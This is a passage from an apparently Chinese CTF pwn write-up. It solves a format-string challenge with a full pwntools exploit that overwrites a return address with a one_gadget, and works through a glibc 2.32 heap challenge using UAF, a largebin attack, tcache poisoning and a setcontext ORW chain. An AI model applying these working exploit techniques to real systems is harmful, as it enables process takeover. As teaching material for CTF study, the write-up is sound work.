class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What would you like to let Yukkri say?&quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( buf[v1 - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">      buf[v1 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    print_str(buf);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;anything else?(Y/n)&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%2s&quot;</span>, s1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;n&quot;</span>) &amp;&amp; <span class="built_in">strcmp</span>(s1, <span class="string">&quot;N&quot;</span>) );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Yukkri prepared a gift for you: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, str, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(str);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>跟进一下print_str函数</em></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">print_str</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> ii; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> l; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> m; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *j; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt; <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt; <span class="number">50</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%*s&quot;</span>, <span class="number">51</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">51</span>; ++i )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">95</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n%*s/ %*s \\\n&quot;</span>, <span class="number">50</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008, <span class="number">50</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">      <span class="keyword">for</span> ( j = a1; j &lt; &amp;a1[v8]; j += <span class="number">50</span> )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%*s| %-50.50s |\n&quot;</span>, <span class="number">50</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008, j);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%*s\\___  &quot;</span>, <span class="number">50</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">46</span>; ++k )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">95</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%*s&quot;</span>, <span class="number">51</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">      <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt;= v8 + <span class="number">1</span>; ++l )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">95</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n%*s/ %*s \\\n&quot;</span>, <span class="number">50</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008, v8, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%*s| %s |\n&quot;</span>, <span class="number">50</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008, a1);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%*s\\___  &quot;</span>, <span class="number">50</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">      <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; v8 - <span class="number">3</span>; ++m )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">95</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%*s&quot;</span>, <span class="number">51</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">    <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">21</span>; ++n )</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="number">95</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%*s/ %*s \\\n&quot;</span>, <span class="number">50</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008, <span class="number">20</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;%*s| %*s%s%*s |\n&quot;</span>,</span><br><span class="line">      <span class="number">50</span>,</span><br><span class="line">      (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008,</span><br><span class="line">      (<span class="number">20</span> - v8) / <span class="number">2</span> + v8 % <span class="number">2</span>,</span><br><span class="line">      (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008,</span><br><span class="line">      a1,</span><br><span class="line">      (<span class="number">20</span> - v8) / <span class="number">2</span>,</span><br><span class="line">      (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%*s\\___  &quot;</span>, <span class="number">50</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">    <span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt;= <span class="number">16</span>; ++ii )</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="number">95</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%*s|/\n&quot;</span>, <span class="number">54</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;unk_402008);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, yukkuri);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>直接看不好看懂 直接运行一下脚本 发现是一个图形</em></p>
<p><em><img src="https://pic.imgdb.cn/item/63d4aa05face21e9ef61cd53.png"></em></p>
<p>分析一下题目给我们的机会 首先是可以无限循环对栈上数据0x100字节大小的修改 并且还可以泄露栈上的数据</p>
<p>然后还有一次非栈上格式化字符串漏洞的机会</p>
<p>这题要想获取shell 只能通过覆盖ret addr 但是由于开启了canary 常规的栈溢出行不通 write泄露的栈内容长度又够不到canary</p>
<p>那么只能想办法通过非栈上格式化字符串漏洞来任意写到栈上的ret addr 使其为onegadget 这样就可以成功获取shell</p>
<p>那么我们就需要泄露栈地址和libc基址</p>
<p>gdb动调看一下</p>
<p><img src="https://pic.imgdb.cn/item/63d4da65face21e9efd28410.png"></p>
<p>当我们输入的payload大于0x50字节的时候 断点打在0x4014EF处 我们发现payload&#x3D; cyclic(0x100)时</p>
<p>可以泄露出栈上的地址 当我们输入的payload &#x3D; cyclic(0x98)时 可以泄露出stderr的真实地址</p>
<p><img src="https://pic.imgdb.cn/item/63d4db70face21e9efd50f29.png"></p>
<p>我们成功获得了栈地址和libc基址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">splitaddr</span>(<span class="params">target_addr</span>):</span><br><span class="line">    addr = []</span><br><span class="line">    curr = <span class="number">0</span>          </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        num = target_addr % <span class="number">65536</span></span><br><span class="line">        tmp = (num - curr + <span class="number">65536</span>) % <span class="number">65536</span></span><br><span class="line">        addr.append(tmp)</span><br><span class="line">        curr = (curr + tmp) % <span class="number">65536</span></span><br><span class="line">        target_addr = target_addr &gt;&gt; <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc =ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;What would you like to let Yukkri say?&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x98</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = addr - libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)&quot;</span>,<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x100</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x8</span></span><br><span class="line">success(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)&quot;</span>,<span class="string">b&#x27;Y&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>首先由于非栈上格式化字符串并没有办法直接对栈数据更改 所以我们还需要先修改栈上的数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(stack_addr)</span><br><span class="line">payload += p64(stack_addr+<span class="number">2</span>)</span><br><span class="line">payload += p64(stack_addr+<span class="number">4</span>)</span><br><span class="line">payload += p64(stack_addr+<span class="number">6</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)&quot;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>非栈上格式化字符串会在栈专题中讲 所以这里就不解释为什么这么写了</p>
<p>最后的关键在于说ret addr的地址是在哪里 我们上面动调也可以看到 是位于stack_addr-0x8处 所以这里任意写其内容为onegadget</p>
<p>完整exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">splitaddr</span>(<span class="params">target_addr</span>):</span><br><span class="line">    addr = []</span><br><span class="line">    curr = <span class="number">0</span>          </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        num = target_addr % <span class="number">65536</span></span><br><span class="line">        tmp = (num - curr + <span class="number">65536</span>) % <span class="number">65536</span></span><br><span class="line">        addr.append(tmp)</span><br><span class="line">        curr = (curr + tmp) % <span class="number">65536</span></span><br><span class="line">        target_addr = target_addr &gt;&gt; <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc =ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;What would you like to let Yukkri say?&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x98</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = addr - libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)&quot;</span>,<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x100</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x8</span></span><br><span class="line">success(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)&quot;</span>,<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line">payload = p64(stack_addr)</span><br><span class="line">payload += p64(stack_addr+<span class="number">2</span>)</span><br><span class="line">payload += p64(stack_addr+<span class="number">4</span>)</span><br><span class="line">payload += p64(stack_addr+<span class="number">6</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)&quot;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">onegadget_addr = <span class="number">0xe3b01</span>+libc_addr</span><br><span class="line">addr = splitaddr(onegadget_addr)</span><br><span class="line">payload = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(addr[<span class="number">0</span>]).encode() + <span class="string">b&quot;lx%8$hn&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(addr[<span class="number">1</span>]).encode() + <span class="string">b&quot;lx%9$hn&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(addr[<span class="number">2</span>]).encode() + <span class="string">b&quot;lx%10$hn&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(addr[<span class="number">3</span>]).encode() + <span class="string">b&quot;lx%11$hn&quot;</span></span><br><span class="line">io.send(payload+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="note-context"><a href="#note-context" class="headerlink" title="note_context"></a>note_context</h3><p>这题是赛后复现的 学到挺多东西 顺便巩固了setcontext的利用</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303201919627.png" alt="image-20230320191900517"></p>
<p>保护全开 环境是2.32</p>
<p>并且开启了沙盒</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303201925615.png" alt="image-20230320192512541"></p>
<p>经典菜单题 伪代码这里就不放了 一共给了四个函数</p>
<p>add函数可以申请chunk 大小限制在0x500-0x900</p>
<p>delete函数没有置零堆块指针 存在UAF</p>
<p>show函数可以打印堆块内容 </p>
<p>edit函数不存在堆溢出 根据最开始申请chunk时输入的size</p>
<p>由于对申请chunk的限制 一开始我们能考虑的只有unsortedbin attack 和 largebin attack</p>
<p>但是前者相对鸡肋 需要我们对任意申请地址已经有edit能力 后者也只能做到任意地址写堆地址</p>
<p>house of storm需要最后申请的chunk大小符合0x50链表 所以也没有办法</p>
<p>那么我们需要另寻出路 覆盖mp_.tcache_bins来使得size较大的chunk也能被释放到tcachebin中 从而可以打tcachebin attack 任意地址写</p>
<p>这里采用largebin attack任意写的那一套</p>
<p>我们先泄露基址 注意一下末尾00 需要覆盖一下 否则puts无法泄露</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x800</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x7f0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1</span>-<span class="number">96</span></span><br><span class="line">libc_addr = main_arena_addr - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>顺便把chunk0释放到largebin后 泄露一下堆地址 因为这个版本已经有了fd异或保护机制</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">3</span>,<span class="number">0x900</span>)</span><br><span class="line">edit(<span class="number">0</span>,cyclic(<span class="number">0x10</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x290</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mp_tcache_bins = libc_addr + <span class="number">0x1e32d0</span></span><br><span class="line">success(<span class="string">&quot;mp_tcache_bins :&quot;</span>+<span class="built_in">hex</span>(mp_tcache_bins))</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(mp_tcache_bins-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(mp_tcache_bins-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x900</span>)</span><br></pre></td></tr></table></figure>

<p>然后就是largebin attack的部分 此时mp_tcache_bins处已经被写入一个很大的值 小于这个值的都会被释放进tcachebin</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303201950042.png" alt="image-20230320195049984"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">5</span>,<span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x900</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">key = ( heap_addr + <span class="number">0x3000</span> ) &gt;&gt;<span class="number">12</span></span><br><span class="line">success(<span class="string">&quot;key :&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">edit(<span class="number">6</span>,p64(key^(free_hook)))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x900</span>)</span><br></pre></td></tr></table></figure>

<p>接下来利用tcache 申请到free_hook的空间</p>
<p>接下来就是重头戏了 由于开启了沙盒 所以我们只能用orw来泄露flag</p>
<p>2.29以前 setcontext是通过rdi寄存器来寻址 相对来说很好控制 但是2.32是由rdx来寻址 我们需要想办法控制rdx寄存器的值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000005306</span>D                 mov     rsp, [rdx+<span class="number">0</span>A0h]</span><br><span class="line">.text:<span class="number">0000000000053074</span>                 mov     rbx, [rdx+<span class="number">80</span>h]</span><br><span class="line">.text:<span class="number">000000000005307B</span>                 mov     rbp, [rdx+<span class="number">78</span>h]</span><br><span class="line">.text:<span class="number">000000000005307F</span>                 mov     r12, [rdx+<span class="number">48</span>h]</span><br><span class="line">.text:<span class="number">0000000000053083</span>                 mov     r13, [rdx+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">0000000000053087</span>                 mov     r14, [rdx+<span class="number">58</span>h]</span><br><span class="line">.text:<span class="number">000000000005308B</span>                 mov     r15, [rdx+<span class="number">60</span>h]</span><br><span class="line">.text:<span class="number">000000000005308F</span>                 test    dword ptr fs:<span class="number">48</span>h, <span class="number">2</span></span><br><span class="line">.text:<span class="number">000000000005309B</span>                 jz      loc_53156</span><br><span class="line">.text:<span class="number">0000000000053156</span> loc_53156:                              ; CODE XREF: </span><br><span class="line">.text:<span class="number">0000000000053156</span>                 mov     rcx, [rdx+<span class="number">0</span>A8h]</span><br><span class="line">.text:<span class="number">000000000005315</span>D                 push    rcx</span><br><span class="line">.text:<span class="number">000000000005315</span>E                 mov     rsi, [rdx+<span class="number">70</span>h]</span><br><span class="line">.text:<span class="number">0000000000053162</span>                 mov     rdi, [rdx+<span class="number">68</span>h]</span><br><span class="line">.text:<span class="number">0000000000053166</span>                 mov     rcx, [rdx+<span class="number">98</span>h]</span><br><span class="line">.text:<span class="number">000000000005316</span>D                 mov     r8, [rdx+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">0000000000053171</span>                 mov     r9, [rdx+<span class="number">30</span>h]</span><br><span class="line">.text:<span class="number">0000000000053175</span>                 mov     rdx, [rdx+<span class="number">88</span>h]</span><br></pre></td></tr></table></figure>

<p>利用ropper工具 可以搜索libc文件中的gadget 看看有没有能达到我们目的的</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303201957342.png" alt="image-20230320195713239"></p>
<p>其中 我们找到了符合我们要求的 可以通过rdi的值来影响到rdx</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303201957574.png" alt="image-20230320195748520"></p>
<p>如果调用free函数 那么rdi寄存器存的就是我们想要释放的堆块的用户地址 并且利用call指令 还可以进行下一步跳转 也就是跳转到setcontext上</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ret_addr = libc_addr + <span class="number">0x26699</span></span><br><span class="line">rdi_addr = libc_addr + <span class="number">0x2858f</span></span><br><span class="line">rsi_addr = libc_addr + <span class="number">0x2ac3f</span></span><br><span class="line">rdx_r12_addr = libc_addr + <span class="number">0x114161</span></span><br><span class="line">rax_addr = libc_addr + <span class="number">0x45580</span></span><br><span class="line">setcontext_addr = libc_addr + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">gadget_addr = libc_addr + <span class="number">0x000000000014b760</span></span><br><span class="line">chunk8_addr = heap_addr +<span class="number">0x36e0</span></span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(chunk8_addr))</span><br><span class="line">flag_addr = chunk8_addr + <span 